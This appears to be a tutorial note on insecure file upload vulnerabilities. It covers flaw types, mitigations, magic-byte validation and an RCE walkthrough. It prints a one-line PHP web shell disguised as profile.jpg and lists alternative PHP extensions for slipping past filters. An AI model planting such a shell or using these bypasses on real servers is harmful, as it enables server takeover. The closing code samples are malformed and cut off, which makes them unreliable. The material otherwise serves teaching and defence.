### Overview
Insecure file upload is a significant security vulnerability that occurs when a web application allows users to upload files without properly validating and securing the uploaded content. This vulnerability can lead to severe consequences, such as unauthorized access, code execution, data breaches, and complete compromise of the web server.

#### Features
1. **Bypassing File Type Validation:** Web applications often perform basic validation to check the file type based on its extension. However, attackers can easily manipulate the file extension or MIME type to bypass this check. For example, they can rename a malicious executable file to have an image extension like ".jpg" and upload it.
2. **Uploading Malicious Content:** Attackers can upload malicious files (e.g., web shells, backdoors, viruses) that can be executed on the server, allowing them to gain unauthorized access and control over the system.
3. **Overwriting Existing Files:** If the application allows users to upload files with arbitrary names, attackers can potentially overwrite important files, causing data loss or compromising the integrity of the application.
4. **Denial of Service (DoS):** Attackers can upload large files or use an excessively high number of file uploads to consume server resources, leading to a denial of service for legitimate users.
5. **Path Traversal Attacks:** If the application does not restrict the file upload location, an attacker may be able to traverse directories and upload files to sensitive areas of the server.
6. **Content Spoofing:** An attacker might upload files with misleading names or content to deceive users and perform social engineering attacks.

#### Examples
1. **Bypassing File Type Validation:** 
	- Attackers can upload malicious files by renaming them with a different extension to bypass file type validation. They can upload a PHP web shell by renaming it to have a harmless extension like ".jpg".
	```bash
	Malicious file: evil_shell.php Renamed to: evil_shell.jpg
	```
2. **Uploading Malicious Content:** 
	- Attackers can upload malicious files containing malicious code, such as web shells, backdoors, or viruses, which can be executed on the server and grant unauthorized access. 
	- Example: An attacker uploads a PHP web shell named `backdoor.php`. When the web shell is accessed through the web browser, the attacker gains control over the server and can execute commands.
3. **Overwriting Existing Files:**
	* If the application allows users to upload files with arbitrary names, attackers can upload a file with the same name as an existing critical file, overwriting it.
	- Example: An attacker uploads a file named important_config.php, replacing the original configuration file, and causes the application to malfunction or leak sensitive information.
4. **Denial of Service (DoS):** 
	- Attackers can flood the application with multiple large file uploads, exhausting server resources and causing a denial of service for legitimate users.
	- Example: An attacker repeatedly uploads large files, consuming all available storage space on the server, and causing other legitimate uploads to fail.
5. **Path Traversal Attacks:** 
	- If the application does not properly validate the file path, attackers can traverse directories and upload files to sensitive areas of the server.
	- Example: If the application appends user-supplied input directly to the file upload path, an attacker might upload a file with a path like `../../../../../etc/passwd`, potentially exposing sensitive system files.
6. **Content Spoofing:** 
	- Attackers might upload files with misleading names or content to deceive users, leading to social engineering attacks.
	- Example: An attacker uploads a file named invoice.doc, but the file contains malware or phishing content, tricking users into downloading and opening the malicious file.

#### Mitigation
1. **File Type Validation:** Check the file's actual content (e.g., using file signatures or magic numbers) to verify its type, rather than relying solely on the file extension.
2. **Limit File Size:** Set a reasonable limit for file sizes to prevent excessive resource usage and DoS attacks.
3. **Rename Uploaded Files:** Generate a random or unique filename for the uploaded file to prevent overwriting and directory traversal attacks.
4. **Store Files Securely:** Store uploaded files outside the webroot and apply strict file permissions to limit access.
5. **Disable Execution:** Do not allow uploaded files to be executed as scripts or programs on the server.
6. **Use a Content Delivery Network (CDN):** Consider using a CDN to host user-uploaded files separately from the application server.
7. **Regular Security Testing:** Perform security testing, including code reviews and penetration testing, to identify and fix potential vulnerabilities in the file upload functionality.

### File Upload Types
**Note:** If the PHP extension file is filtered you can replace it by another `.php` alternatives
`.phtml`, `.php2`, `.php3`, `.php4`, `.php5`, `.inc`, `.phps`, .`phtm`, `.phar`
#### Overview
1. **Bypassing File Type Validation:** 
	- The application relies solely on the file extension to determine the file type, enabling attackers to upload malicious files by renaming them with a trusted extension.
	- Exploitation: An attacker uploads a PHP web shell by renaming it with a ".jpg" extension. If the application fails to validate the file's content, the PHP file may be executed on the server, leading to unauthorized access.
2. **Overwriting Sensitive Files:** 
	- If the application allows users to upload files with arbitrary names, an attacker can overwrite critical files.
	- Exploitation: The attacker uploads a file named "config.php," effectively overwriting the application's configuration file, which may reveal sensitive information or render the application inoperable.
3. **Executing Uploaded Scripts:** 
	- The application directly executes uploaded scripts, allowing attackers to run arbitrary code on the server.
	- Exploitation: An attacker uploads a malicious PHP script, and the application executes the script, granting the attacker unauthorized access to the server.
4. **Path Traversal Attacks:** 
	- The application does not restrict the file upload location, enabling attackers to traverse directories and upload files to sensitive areas.
	- Exploitation: If the application directly uses user input to construct the file path, an attacker might upload a file with a path like "../../../../../etc/passwd," potentially exposing sensitive system files.
5. **Malicious File Content:** 
	- The application does not validate the file's content, allowing attackers to upload files containing malware, viruses, or other harmful content.
	- Exploitation: An attacker uploads a ZIP file containing malware, and the application extracts the files without scanning for malicious content, leading to infection of the server or other clients.
6. **Size Limit Bypass:** 
	- The application enforces file size limits on uploads, but the server-side validation can be bypassed.  
	 - Exploitation: An attacker manipulates the HTTP request to bypass the file size limit, allowing them to upload larger files than intended.

#### File Upload Command Execution
##### Overview
File upload command execution vulnerability, also known as Remote Code Execution (RCE) via file upload, is a critical security flaw that occurs when an attacker can upload a malicious file to a web application and then execute arbitrary code on the server. This vulnerability is particularly dangerous as it allows attackers to gain unauthorized access, take control of the server, and perform malicious activities.

The vulnerability typically arises when the application allows file uploads without properly validating and securing the uploaded files. If the application processes uploaded files as executable code without adequate checks, attackers can abuse this behavior to upload and execute malicious scripts, leading to severe consequences.

1. **Uploading Malicious Script:** The attacker uploads a file containing malicious code (e.g., PHP web shell) to the web application.
2. **Server Processes the File as Code:** The application mistakenly processes the uploaded file as executable code, executing the malicious script on the server.
3. **Remote Code Execution:** As a result, the attacker gains control over the server and can run arbitrary commands, potentially compromising the entire system.

Suppose a web application allows users to upload profile pictures. The application saves the uploaded files to a directory accessible by the web server. However, the application does not properly validate the file type or perform any security checks on the uploaded files.

An attacker takes advantage of this vulnerability and uploads a malicious PHP script named `backdoor.php`, disguised as a harmless image file (e.g., `profile.jpg`).
```bash
Uploaded file: profile.jpg (actually contains PHP code) Content: <?php echo shell_exec($_GET['cmd']); ?>
```

The application stores the malicious file `profile.jpg` in the server's upload directory. When the attacker navigates to the URL `https://example.com/uploads/profile.jpg?cmd=whoami`, the PHP code in the file is executed, and the output of the `whoami` command is returned: `Output: www-data`

By controlling the `cmd` parameter in the URL, the attacker can execute arbitrary commands on the server, such as accessing sensitive files, creating new user accounts, or even gaining full control of the system.

#### File Upload Magic Bytes
##### Overview
File upload magic bytes, also known as file signatures or magic numbers, are a sequence of bytes at the beginning of a file that uniquely identifies its file type or format. These bytes help applications and operating systems determine the type of content contained in the file, even before examining the file extension. Using magic bytes is a crucial part of file type validation during file upload and processing to ensure that uploaded files are of the expected format.

1. **File Signature Identification:** Each file type has a specific pattern of bytes at the beginning of the file that serves as its unique identifier. These patterns are predefined and well-documented for various file types.
2. **Magic Bytes Validation:** When a file is uploaded, the web application reads the initial bytes of the file and compares them with known magic bytes for various file types. If the bytes match any of the recognized patterns, the application can confidently identify the file type.
3. **File Type Determination:** Based on the identified magic bytes, the application can determine the file's actual type, such as image, audio, video, document, or executable.

By using magic bytes, the application can detect the file type accurately, regardless of the file extension provided by the user. This helps prevent the execution of malicious files, such as scripts or viruses, during the file upload process.

- **JPEG Image:** Magic Bytes: `FF D8 FF` Description: The first three bytes of a JPEG image file are `0xFF`, `0xD8`, and `0xFF`.
- **PNG Image:** Magic Bytes: `89 50 4E 47 0D 0A 1A 0A` Description: The first eight bytes of a PNG image file form the signature `89PNG`.
- **PDF Document:** Magic Bytes: `%PDF-1.` Description: A PDF file starts with the ASCII characters `%PDF-1.`.
- **ZIP Archive:** Magic Bytes: `50 4B 03 04` Description: ZIP files start with the signature `PK\x03\x04`.

# PDF magic bytes: %PDF-1. 
if file_content == b'%PDF-1.':
	print("File is a PDF document.") 
else:     
	print("File is not a PDF document.")
```
4. **ZIP Archive Upload:**
```python
# Assuming you have a file upload named "file" in your web application
# Here, we read the first 4 bytes to check for ZIP magic bytes
